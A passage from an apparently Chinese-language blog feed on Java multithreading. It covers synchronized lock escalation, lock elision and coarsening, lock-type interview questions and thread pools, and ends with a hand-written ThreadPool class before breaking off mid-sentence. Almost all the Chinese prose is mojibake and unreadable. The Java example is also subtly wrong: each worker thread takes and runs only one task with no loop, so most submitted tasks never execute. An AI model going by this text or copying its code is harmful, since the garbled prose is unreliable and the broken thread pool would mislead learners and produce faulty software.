é”ä¸¤ä¸ªçº¿ç¨‹è¯»ä¼šäº§ç”Ÿäº’æ–¥ï¼Œäº§ç”Ÿé˜»å¡.ï¼ˆæ€§èƒ½æŸå¤±ï¼‰<br>å¦‚æœå®Œå…¨ç»™è¯»æ“ä½œä¸åŠ é”ï¼Œä¸€ä¸ªçº¿ç¨‹è¯»ä¸€ä¸ªçº¿ç¨‹å†™ï¼Œå¯èƒ½ä¼šè¯»åˆ°å†™äº†ä¸€åŠçš„æ•°æ®.<br>å¼•å…¥è¯»å†™é”å°±å¯ä»¥è§£å†³.</p><h4 id="Synchronizedé”çš„å†…éƒ¨ä¼˜åŒ–"><a href="#Synchronizedé”çš„å†…éƒ¨ä¼˜åŒ–" class="headerlink" title="Synchronizedé”çš„å†…éƒ¨ä¼˜åŒ–"></a>Synchronizedé”çš„å†…éƒ¨ä¼˜åŒ–</h4><p>ä¸Šè¿°é”ç­–ç•¥å·²ç»å¯ä»¥æ˜ç¡®synchronizedå†…éƒ¨æœ‰ä¸€å¥—è‡ªå·±ä¼˜åŒ–çš„ç­–ç•¥ï¼Œä½¿å¾—synchronizedèƒ½å¤Ÿé€‚åº”å¤šç§æƒ…æ™¯.</p><p>å½“çº¿ç¨‹æ‰§è¡Œåˆ°æœªåŠ é”çš„synchronizedä¸­çš„å¯¹è±¡æ—¶ä¼šç»å†ä»¥ä¸‹ä¸‰ä¸ªè¿‡ç¨‹.<strong>ç›®å‰æ¥çœ‹æ­¤å¤„çš„é”çº§åˆ«æ˜¯ä¸èƒ½é™çº§çš„.</strong></p><h5 id="åå‘é”ï¼ˆå‡è®¾æ²¡çº¿ç¨‹æ¥ç«äº‰é”ï¼‰"><a href="#åå‘é”ï¼ˆå‡è®¾æ²¡çº¿ç¨‹æ¥ç«äº‰é”ï¼‰" class="headerlink" title="åå‘é”ï¼ˆå‡è®¾æ²¡çº¿ç¨‹æ¥ç«äº‰é”ï¼‰"></a>åå‘é”ï¼ˆå‡è®¾æ²¡çº¿ç¨‹æ¥ç«äº‰é”ï¼‰</h5><p><strong>æ ¸å¿ƒæ€æƒ³æ˜¯æ‡’æ±‰æ¨¡å¼</strong>ï¼Œåœ¨éœ€è¦ç”¨åˆ°çš„æ—¶å€™æ‰åŠ é”ï¼Œèƒ½æ™šåŠ é”å°±æ™šåŠ é”.ä½†å¹¶<strong>æœªçœŸæ­£åŠ é”ï¼Œè€Œæ˜¯åœ¨çº¿ç¨‹ä¸ŠåŠ ä¸€ä¸ªè½»é‡çº§çš„æ ‡è®°</strong>.å¦‚æœæ²¡æœ‰å…¶ä»–çº¿ç¨‹æ¥ç«äº‰å°±çœå»åŠ é”æ“ä½œï¼Œå¦åˆ™å‡çº§æœªè½»é‡çº§æ“ä½œ.</p><h5 id="è½»é‡çº§é”ï¼ˆå‡è®¾ç«äº‰å°ï¼‰"><a href="#è½»é‡çº§é”ï¼ˆå‡è®¾ç«äº‰å°ï¼‰" class="headerlink" title="è½»é‡çº§é”ï¼ˆå‡è®¾ç«äº‰å°ï¼‰"></a>è½»é‡çº§é”ï¼ˆå‡è®¾ç«äº‰å°ï¼‰</h5><p>é€šè¿‡è‡ªæ—‹é”å®ç°.<br>ä¼˜åŠ¿ï¼šåªè¦å¦å¤–çš„çº¿ç¨‹é‡Šæ”¾é”å°±å¯ä»¥ç«‹é©¬æ‹¿åˆ°é”.ï¼ˆåšæŒä¸æ‡ˆçš„èˆ”ç‹— bushiï¼‰<br>åŠ£åŠ¿ï¼šæ¯”è¾ƒæ¶ˆè€—CPUèµ„æº.<br>æ­¤é˜¶æ®µsynchronizedå†…éƒ¨ä¼šç»Ÿè®¡å½“å‰è¿™ä¸ªé”å¯¹è±¡ä¸Šæœ‰å¤šå°‘ä¸ªçº¿ç¨‹åœ¨å‚ä¸ç«äº‰.å¦‚æœç«äº‰è€…è¾ƒå¤šå°±ä¼šå‡çº§åˆ°é‡é‡çº§é”.</p><h5 id="é‡é‡çº§é”ï¼ˆå‡è®¾ç«äº‰å¤§ï¼‰"><a href="#é‡é‡çº§é”ï¼ˆå‡è®¾ç«äº‰å¤§ï¼‰" class="headerlink" title="é‡é‡çº§é”ï¼ˆå‡è®¾ç«äº‰å¤§ï¼‰"></a>é‡é‡çº§é”ï¼ˆå‡è®¾ç«äº‰å¤§ï¼‰</h5><p>æ­¤æ—¶æ‹¿ä¸åˆ°é”çš„çº¿ç¨‹ä¸å†è¿›è¡Œè‡ªæ—‹è€Œæ˜¯é˜»å¡ç­‰å¾….<br>è®©å‡ºCPUä½¿ç”¨æƒã€é˜²æ­¢CPUå ç”¨ç‡è¿‡é«˜ã€‘<br>å½“å‰çº¿ç¨‹é‡Šæ”¾é”æ—¶ï¼Œç³»ç»Ÿä¼šéšæœºåˆ†é…å¦ä¸€ä¸ªçº¿ç¨‹æ¥è·å–é”.</p><h6 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h6><p><strong>åå‘é”åˆ°è½»é‡çº§é”è¿™ä¸ªè¿‡ç¨‹ä¸æ¶‰åŠè§£é”ï¼Œåªæ˜¯ç¡®ä¿æœ‰åå‘é”çŠ¶æ€çš„çº¿ç¨‹å…ˆæ‹¿åˆ°é”ï¼ˆä¼˜å…ˆæ€§ï¼‰</strong><br><strong>åå‘é”æ ‡è®°æ˜¯æ¯ä¸ªå¯¹è±¡å¤´çš„ä¸€ä¸ªå±æ€§ï¼Œæ¯ä¸ªå¯¹è±¡éƒ½æœ‰è‡ªå·±å”¯ä¸€çš„æ ‡è®°.å½“é”å¯¹è±¡é¦–æ¬¡åŠ é”æ—¶è¿›å…¥åå‘é”çŠ¶æ€ï¼Œå¦‚æœè¿™ä¸ªåŠ é”è¿‡ç¨‹æ²¡æœ‰æ¶‰åŠé”ç«äº‰ä¸‹æ¬¡åŠ é”è¿˜æ˜¯åå‘é”ï¼Œå¦åˆ™è·³è¿‡åå‘é”åˆ°ä¸‹ä¸€çº§é˜¶æ®µï¼ˆè½»é‡çº§é”ï¼‰.</strong></p><h5 id="é”æ¶ˆé™¤ç­–ç•¥"><a href="#é”æ¶ˆé™¤ç­–ç•¥" class="headerlink" title="é”æ¶ˆé™¤ç­–ç•¥"></a>é”æ¶ˆé™¤ç­–ç•¥</h5><p>ç¼–è¯‘å™¨çš„ä¸€ç§ä¼˜åŒ–æ–¹å¼.æ¯”é‚£ä¸€èµ·ç¼–è¯‘ä»£ç çš„æ—¶å€™é‡åˆ°é”™è¯¯ä»£ç å°±ä¸ä¼šåŠ é”ï¼Œè€Œæ˜¯è‡ªåŠ¨æŠŠé”å–æ¶ˆ.<br>æ¯”å¦‚åŠ é”ä»£ç ä¸­æ²¡æœ‰æ¶‰åŠåˆ°æˆå‘˜å˜é‡çš„ä¿®æ”¹åªæœ‰ä¸€äº›å±€éƒ¨å˜é‡æ˜¯ä¸ç”¨åŠ é”çš„.<br><strong>é’ˆå¯¹ä¸€çœ¼è¯†åˆ«çš„å®Œå…¨ä¸æ¶‰åŠçº¿ç¨‹å®‰å…¨é—®é¢˜çš„ä»£ç èƒ½å¤ŸæŠŠé”æ¶ˆé™¤æ‰.ä½†æ˜¯åªæœ‰åå‘é”è¿è¡Œèµ·æ¥æ‰çŸ¥é“æœ‰æ²¡æœ‰é”å†²çª.</strong></p><h5 id="é”ç²—åŒ–"><a href="#é”ç²—åŒ–" class="headerlink" title="é”ç²—åŒ–"></a>é”ç²—åŒ–</h5><p>æ€ä¹ˆåˆ†åˆ«æ­¤å¤„çš„ç²—ç»†ï¼Ÿ<br><strong>synchrionized{ }ä¸­çš„ä»£ç è¶Šå°‘å°±è®¤ä¸ºé”çš„ç²’åº¦è¶Šç»†åŒ…å«çš„ä»£ç è¶Šå¤šå°±è®¤ä¸ºé”çš„ç²’åº¦è¶Šç²—</strong><br>åŒæ ·çš„ï¼Œä¸åŒçš„åœºæ™¯éœ€è¦çš„é”ç²—ç»†ç²’åº¦ä¸åŒï¼Œè§†å…·ä½“æƒ…å†µè€Œå®š.<br><strong>é”ç²—åŒ–ä¼šå°†å¤šä¸ªç»†ç²’åº¦çš„é”,åˆå¹¶æˆä¸€ä¸ªç²—ç²’åº¦çš„é”,é¿å…äº†é‡å¤åŠ é”è§£é”çš„è¿‡ç¨‹</strong></p><h5 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h5><h6 id="1-æ€ä¹ˆç†è§£ä¹è§‚é”å’Œæ‚²è§‚é”çš„ï¼Œå…·ä½“æ€ä¹ˆå®ç°ï¼Ÿ"><a href="#1-æ€ä¹ˆç†è§£ä¹è§‚é”å’Œæ‚²è§‚é”çš„ï¼Œå…·ä½“æ€ä¹ˆå®ç°ï¼Ÿ" class="headerlink" title="1.æ€ä¹ˆç†è§£ä¹è§‚é”å’Œæ‚²è§‚é”çš„ï¼Œå…·ä½“æ€ä¹ˆå®ç°ï¼Ÿ"></a>1.æ€ä¹ˆç†è§£ä¹è§‚é”å’Œæ‚²è§‚é”çš„ï¼Œå…·ä½“æ€ä¹ˆå®ç°ï¼Ÿ</h6><p>æ‚²è§‚é”è®¤ä¸ºå¤šä¸ªçº¿ç¨‹è®¿é—®åŒâ¼€ä¸ªå…±äº«å˜é‡å†²çªçš„æ¦‚ç‡è¾ƒâ¼¤, ä¼šåœ¨æ¯æ¬¡è®¿é—®å…±äº«å˜é‡ä¹‹å‰éƒ½å»çœŸæ­£åŠ é”. ä¹è§‚é”è®¤ä¸ºå¤šä¸ªçº¿ç¨‹è®¿é—®åŒâ¼€ä¸ªå…±äº«å˜é‡å†²çªçš„æ¦‚ç‡ä¸â¼¤. å¹¶ä¸ä¼šçœŸçš„åŠ é”, â½½æ˜¯ç›´æ¥å°è¯•è®¿é—®æ•°æ®. åœ¨è®¿é—®çš„åŒæ—¶è¯†åˆ«å½“å‰çš„æ•°æ®æ˜¯å¦å‡ºç°è®¿é—®å†²çª. </p><p>æ‚²è§‚é”çš„å®ç°å°±æ˜¯å…ˆåŠ é”(â½å¦‚å€ŸåŠ©æ“ä½œç³»ç»Ÿæä¾›çš„ mutex), è·å–åˆ°é”å†æ“ä½œæ•°æ®. è·å–ä¸åˆ°é”å°±ç­‰å¾…. ä¹è§‚é”çš„å®ç°å¯ä»¥å¼•â¼Šâ¼€ä¸ªç‰ˆæœ¬å·. å€ŸåŠ©ç‰ˆæœ¬å·è¯†åˆ«å‡ºå½“å‰çš„æ•°æ®è®¿é—®æ˜¯å¦å†²çª. (å®ç°ç»†èŠ‚å‚è€ƒä¸Šâ¾¯ çš„å›¾). </p><h6 id="2-ä»‹ç»è¯»å†™é”"><a href="#2-ä»‹ç»è¯»å†™é”" class="headerlink" title="2.ä»‹ç»è¯»å†™é”"></a>2.ä»‹ç»è¯»å†™é”</h6><p>è¯»å†™é”å°±æ˜¯æŠŠè¯»æ“ä½œå’Œå†™æ“ä½œåˆ†åˆ«è¿›â¾åŠ é”. è¯»é”å’Œè¯»é”ä¹‹é—´ä¸äº’æ–¥. æ¯”ç‰¹å°±ä¸šè¯¾ å†™é”å’Œå†™é”ä¹‹é—´äº’æ–¥. å†™é”å’Œè¯»é”ä¹‹é—´äº’æ–¥. è¯»å†™é”æœ€ä¸»è¦â½¤åœ¨ â€œé¢‘ç¹è¯», ä¸é¢‘ç¹å†™â€ çš„åœºæ™¯ä¸­. </p><h6 id="3-ä»€ä¹ˆæ˜¯â¾ƒæ—‹é”ï¼Œä¸ºä»€ä¹ˆè¦ä½¿â½¤â¾ƒæ—‹é”ç­–ç•¥ï¼Œç¼ºç‚¹æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#3-ä»€ä¹ˆæ˜¯â¾ƒæ—‹é”ï¼Œä¸ºä»€ä¹ˆè¦ä½¿â½¤â¾ƒæ—‹é”ç­–ç•¥ï¼Œç¼ºç‚¹æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="3.ä»€ä¹ˆæ˜¯â¾ƒæ—‹é”ï¼Œä¸ºä»€ä¹ˆè¦ä½¿â½¤â¾ƒæ—‹é”ç­–ç•¥ï¼Œç¼ºç‚¹æ˜¯ä»€ä¹ˆï¼Ÿ"></a>3.ä»€ä¹ˆæ˜¯â¾ƒæ—‹é”ï¼Œä¸ºä»€ä¹ˆè¦ä½¿â½¤â¾ƒæ—‹é”ç­–ç•¥ï¼Œç¼ºç‚¹æ˜¯ä»€ä¹ˆï¼Ÿ</h6><p>å¦‚æœè·å–é”å¤±è´¥, â½´å³å†å°è¯•è·å–é”, â½†é™å¾ªç¯, ç›´åˆ°è·å–åˆ°é”ä¸ºâ½Œ. ç¬¬â¼€æ¬¡è·å–é”å¤±è´¥, ç¬¬â¼†æ¬¡çš„å°è¯• ä¼šåœ¨æçŸ­çš„æ—¶é—´å†…åˆ°æ¥. â¼€æ—¦é”è¢«å…¶ä»–çº¿ç¨‹é‡Šæ”¾, å°±èƒ½ç¬¬â¼€æ—¶é—´è·å–åˆ°é”. ç›¸â½äºæŒ‚èµ·ç­‰å¾…é”, ä¼˜ç‚¹: æ²¡æœ‰æ”¾å¼ƒ CPU èµ„æº, â¼€æ—¦é”è¢«é‡Šæ”¾å°±èƒ½ç¬¬â¼€æ—¶é—´è·å–åˆ°é”, æ›´â¾¼æ•ˆ. åœ¨é”æŒæœ‰æ—¶é—´â½è¾ƒçŸ­çš„åœºæ™¯ ä¸‹â¾®å¸¸æœ‰â½¤. ç¼ºç‚¹: å¦‚æœé”çš„æŒæœ‰æ—¶é—´è¾ƒâ»“, å°±ä¼šæµªè´¹ CPU èµ„æº. </p><h6 id="4-synchronized-æ˜¯å¯é‡â¼Šé”å—ï¼Ÿ"><a href="#4-synchronized-æ˜¯å¯é‡â¼Šé”å—ï¼Ÿ" class="headerlink" title="4.synchronized æ˜¯å¯é‡â¼Šé”å—ï¼Ÿ"></a>4.synchronized æ˜¯å¯é‡â¼Šé”å—ï¼Ÿ</h6><p>æ˜¯å¯é‡â¼Šé”. å¯é‡â¼Šé”æŒ‡çš„å°±æ˜¯è¿ç»­ä¸¤æ¬¡åŠ é”ä¸ä¼šå¯¼è‡´æ­»é”. å®ç°çš„â½…å¼æ˜¯åœ¨é”ä¸­è®°å½•è¯¥é”æŒæœ‰çš„çº¿ç¨‹â¾ä»½, ä»¥åŠâ¼€ä¸ªè®¡æ•°å™¨(è®°å½•åŠ é”æ¬¡æ•°). å¦‚æœå‘ç°å½“å‰åŠ é”çš„ çº¿ç¨‹å°±æ˜¯æŒæœ‰é”çš„çº¿ç¨‹, åˆ™ç›´æ¥è®¡æ•°â¾ƒå¢.</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaå¤šçº¿ç¨‹_0x8_</title>
      <link href="/2024/09/10/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E5%85%AB/"/>
      <url>/2024/09/10/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E5%85%AB/</url>
      
        <content type="html"><![CDATA[<h3 id="å¤šçº¿ç¨‹ç¯‡å…«"><a href="#å¤šçº¿ç¨‹ç¯‡å…«" class="headerlink" title="å¤šçº¿ç¨‹ç¯‡å…«"></a>å¤šçº¿ç¨‹ç¯‡å…«</h3><h4 id="çº¿ç¨‹æ± "><a href="#çº¿ç¨‹æ± " class="headerlink" title="çº¿ç¨‹æ± "></a>çº¿ç¨‹æ± </h4><h5 id="ä»€ä¹ˆæ˜¯çº¿ç¨‹æ± ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯çº¿ç¨‹æ± ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯çº¿ç¨‹æ± ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯çº¿ç¨‹æ± ï¼Ÿ</h5><p>é¡¾åæ€ä¹‰ï¼Œçº¿ç¨‹æ± æ˜¯ä¸€ä¸ªå­˜æ”¾äº†å¾ˆå¤šçº¿ç¨‹çš„æ± å­.æ—¢ç„¶æœ‰å¾ˆå¤šçº¿ç¨‹ï¼Œé‚£ä¸€å®šå¾ˆæ–¹ä¾¿è°ƒç”¨å¯¹å§ï¼Œæœ‰å¾ˆå¤šçº¿ç¨‹é‚£å¤§å®¶ä¸€å®šå–œæ¬¢ä¸€èµ·ç©å§ï¼ˆå¹¶å‘ï¼‰.</p><p><strong>çº¿ç¨‹æ± æ˜¯ä¸€ç§å¹¶å‘ç¼–ç¨‹ä¸­å¸¸ç”¨çš„æŠ€æœ¯ï¼Œç”¨äºç®¡ç†å’Œé‡ç”¨çº¿ç¨‹.</strong><br>çº¿ç¨‹æ± ç”±çº¿ç¨‹æ± ç®¡ç†å™¨ã€å·¥ä½œé˜Ÿåˆ—å’Œçº¿ç¨‹æ± ä¸­çš„çº¿ç¨‹æ„æˆ.</p><h6 id="çº¿ç¨‹æ± çš„ä¼˜ç‚¹"><a href="#çº¿ç¨‹æ± çš„ä¼˜ç‚¹" class="headerlink" title="çº¿ç¨‹æ± çš„ä¼˜ç‚¹"></a>çº¿ç¨‹æ± çš„ä¼˜ç‚¹</h6><p>ç”±äºè¿›ç¨‹çš„é¢‘ç¹åˆ›å»ºå’Œé”€æ¯å¸¦æ¥çš„å·¨å¤§å¼€é”€ï¼Œæ‰€ä»¥èªæ˜çš„å¤§ä½¬ä»¬é€‰æ‹©å¼•å…¥çº¿ç¨‹æ± æˆ–è€…æ›´è½»é‡çº§çš„åç¨‹ï¼ˆçº¤ç¨‹ï¼‰.<br><u>åç¨‹çš„æœ¬è´¨å®¤ç¨‹åºå‘˜å†ç”¨æˆ·æ€ä»£ç ä¸­è¿›è¡Œè°ƒåº¦ï¼Œä¸ä¾èµ–å†…æ ¸.</u><br>çº¯ç”¨æˆ·æ€ä»£ç æ˜¯åŸºäºçº¿ç¨‹å°è£…è¿‡æ¥çš„å°±æ¯”å†…æ ¸è°ƒç”¨æ›´åŠ å®‰å…¨.<br>è€Œå¼•å…¥çº¿ç¨‹æ± å°±èƒ½**å‡å°‘æ¯æ¬¡å¯åŠ¨ã€é”€æ¯çº¿ç¨‹çš„æŸè€—.**ã€ç”¨å®Œäº†ä¹Ÿä¸ç”¨é”€æ¯ï¼Œå¤šæ¬¡åˆ©ç”¨ï¼Œå–œæ¬¢ç”¨ä¸€è¾ˆå­çš„å¥¥ç‰¹ä¹è¢‹å­ï¼(bushiã€‘</p><h5 id="æ ‡å‡†åº“ä¸­çº¿ç¨‹æ± "><a href="#æ ‡å‡†åº“ä¸­çº¿ç¨‹æ± " class="headerlink" title="æ ‡å‡†åº“ä¸­çº¿ç¨‹æ± "></a>æ ‡å‡†åº“ä¸­çº¿ç¨‹æ± </h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/e1997fd3e70b1efe6364bc7231ce5ee2.png" alt="img"><br><strong>Tips</strong></p><p>corePoolSize: æ ¸å¿ƒçº¿ç¨‹æ•°(ä¸€ä¸ªçº¿ç¨‹æ± é‡Œ,æœ€å°‘æœ‰å¤šå°‘ä¸ªçº¿ç¨‹)<br>maximumPoolSize :æœ€å¤§çº¿ç¨‹æ•°(ä¸€ä¸ªçº¿ç¨‹æ± ä¸­,æœ€å¤šæœ‰å¤šå°‘ä¸ªçº¿ç¨‹)<br>keepAliveTime:çº¿ç¨‹ç©ºé—²è¶…è¿‡è¿™ä¸ªæ—¶é—´é˜ˆå€¼,å°±ä¼šè¢«é”€æ¯<br>unit:æ—¶é—´å•ä½,å–åˆ†é’Ÿ,ç§’,å°æ—¶ç­‰ç­‰<br>workQueue:å’Œå®šæ—¶å™¨ç›¸åŒ,çº¿ç¨‹æ± ä¹Ÿå¯ä»¥æœ‰å¾ˆå¤šä»»åŠ¡,ä¹Ÿå¯ä»¥è®¾ç½®ä¸ºå¸¦æœ‰ä¼˜å…ˆçº§çš„<br>ThreadFactory: çº¿ç¨‹å·¥å‚,æœ¬è´¨ä¸Šæ˜¯ç»™newè¿™ä¸ªæ“ä½œå°è£…äº†ä¸€å±‚,å¯èƒ½åŒååŒå‚æ•°çš„æ„é€ æ–¹æ³•,è¿™æ ·æ„æˆä¸äº†é‡è½½,æˆ‘ä»¬å°±æƒ³å¼¥è¡¥ä¸€ä¸‹è¿™ä¸ªç¼ºé™·,å°è£…ä¸€å±‚æ„é€ æ–¹æ³•.</p><h6 id="æ‹’ç»ç­–ç•¥ã€é‡ç‚¹ã€‘"><a href="#æ‹’ç»ç­–ç•¥ã€é‡ç‚¹ã€‘" class="headerlink" title="æ‹’ç»ç­–ç•¥ã€é‡ç‚¹ã€‘"></a>æ‹’ç»ç­–ç•¥ã€é‡ç‚¹ã€‘</h6><p>ä¸€ä¸ªçº¿ç¨‹æ± èƒ½å®¹çº³çš„ä»»åŠ¡æ•°é‡æœ‰é™ï¼Œå½“æŒç»­æ·»åŠ ä»»åŠ¡çš„æ—¶å€™å¯èƒ½ä¼šè¶…å‡ºä¸Šé™ï¼Œè¿™æ—¶å€™æ‹’ç»ç­–ç•¥å°±é—ªäº®ç™»åœºäº†.<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/b46dad933033ffa7e18a70b05d25b072.png" alt="img"></p><p>1.ç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œæ–°ä»»åŠ¡å’Œæ—§ä»»åŠ¡éƒ½ç½¢å·¥.<br>2.æ–°ä»»åŠ¡ç”±æ·»åŠ å®ƒçš„çº¿ç¨‹è‡ªå·±æ‰§è¡Œ.<br>3.ä¸¢å¼ƒä»»åŠ¡é˜Ÿåˆ—ä¸­æœ€è€çš„ä»»åŠ¡<br>4.ä¸¢å¼ƒå½“å‰æ–°åŠ çš„ä»»åŠ¡</p><h6 id="Excutorsåˆ›å»ºçº¿ç¨‹çš„å‡ ç§æ–¹å¼"><a href="#Excutorsåˆ›å»ºçº¿ç¨‹çš„å‡ ç§æ–¹å¼" class="headerlink" title="Excutorsåˆ›å»ºçº¿ç¨‹çš„å‡ ç§æ–¹å¼"></a>Excutorsåˆ›å»ºçº¿ç¨‹çš„å‡ ç§æ–¹å¼</h6><p>newFixedThreadPool:åˆ›å»ºå›ºå®šæ•°ç›®çš„çº¿ç¨‹æ± <br>newCacheThreadPool:åˆ›å»ºçº¿ç¨‹æ•°ç›®åŠ¨æ€å¢é•¿çš„çº¿ç¨‹æ± (æ„é€ å‡ºçš„çº¿ç¨‹æ± å¯¹è±¡éƒ½èƒ½åŠ¨æ€é€‚åº” éœ€è¦æ·»åŠ æ–°ä»»åŠ¡æ—¶çº¿ç¨‹ä¼šæ ¹æ®éœ€è¦è‡ªåŠ¨è¢«åˆ›å»ºå‡ºæ¥ å¹¶ä¸”å¯ä»¥åœ¨æ± ä¸­ä¿ç•™ä¸€æ®µæ—¶é—´)<br>newSingleThreadExcutorï¼šåˆ›å»ºåªåŒ…å«å•ä¸ªçº¿ç¨‹çš„çº¿ç¨‹æ± <br>newScheduledThreadPool:è®¾å®šå»¶è¿Ÿæ—¶é—´çš„æ‰§è¡Œå‘½ä»¤&#x2F;å®šæœŸæ‰§è¡Œå‘½ä»¤(è¿›é˜¶ç‰ˆçš„å®šæ—¶å™¨)</p><h5 id="çº¿ç¨‹æ± çš„å®ç°"><a href="#çº¿ç¨‹æ± çš„å®ç°" class="headerlink" title="çº¿ç¨‹æ± çš„å®ç°"></a>çº¿ç¨‹æ± çš„å®ç°</h5><p>ä¸Šä»£ç ï¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ArrayBlockingQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.BlockingQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThreadPool</span> &#123;</span><br><span class="line">    <span class="comment">//ç”¨äºä¿å­˜çº¿ç¨‹,ç”¨äºä»¥åèƒ½å–å‡ºçº¿ç¨‹å¹¶ä¿®æ”¹</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;Thread&gt; ThreadList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">//ç”¨äºä¿å­˜ä»»åŠ¡çš„é˜Ÿåˆ—</span></span><br><span class="line">    <span class="keyword">private</span> BlockingQueue&lt;Runnable&gt; queue = <span class="keyword">new</span> <span class="title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//é€šè¿‡è¿™ä¸ªæ–¹æ³•,æŠŠè¿™ä¸ªä»»åŠ¡æ·»åŠ åˆ°çº¿ç¨‹æ± ä¸­.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">submit</span><span class="params">(Runnable runnable)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        queue.put(runnable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//é€šè¿‡næŒ‡å®šåˆ›å»ºå¤šå°‘ä¸ªçº¿ç¨‹</span></span><br><span class="line">    <span class="comment">//åˆ›å»ºäº†ä¸€ä¸ªå›ºå®šæ•°é‡çš„çº¿ç¨‹æ± </span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ThreadPool</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">//å–å‡ºä¸€ä¸ªä»»åŠ¡,å¹¶æ‰§è¡Œ</span></span><br><span class="line">                    <span class="type">Runnable</span> <span class="variable">runnable</span> <span class="operator">=</span> queue.take();</span><br><span class="line">                    runnable.run();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            t.start();</span><br><span class="line">            ThreadList.add(t);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">ThreadPool</span> <span class="variable">pool</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadPool</span>(<span class="number">4</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> i;</span><br><span class="line">            pool.submit(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="comment">//è¦æ‰§è¡Œçš„å·¥ä½œ</span></span><br><span class="line">                    System.out.println(<span class="string">&quot;æ‰§è¡Œä»»åŠ¡ &quot;</span> + n + <span class="string">&quot;, å½“å‰çº¿ç¨‹ä¸º: &quot;</span> + Thread.currentThread().getId());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨çº¿ç¨‹æ± éœ€è¦è®¾ç½®çº¿ç¨‹çš„æ•°ç›®ä¸ºå¤šå°‘åˆé€‚ï¼Ÿ</strong><br><u>ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œçš„ä»£ç ä¸»è¦åˆ†ä¸ºä¸¤ç±»</u><br>1.CPUå¯†é›†å‹(ä¸»è¦é€»è¾‘æ˜¯ç®—æœ¯è¿ç®—&#x2F;é€»è¾‘åˆ¤æ–­)<br>2.IOå¯†é›†å‹(ä¸»è¦æ˜¯è¿›è¡ŒIOæ“ä½œ)</p><p>å‡è®¾ä¸€ä¸ªä»£ç çš„æ‰€æœ‰ä»£ç éƒ½è¿˜æ˜¯CPUå¯†é›†å‹çš„è¿™æ—¶çº¿ç¨‹æ± 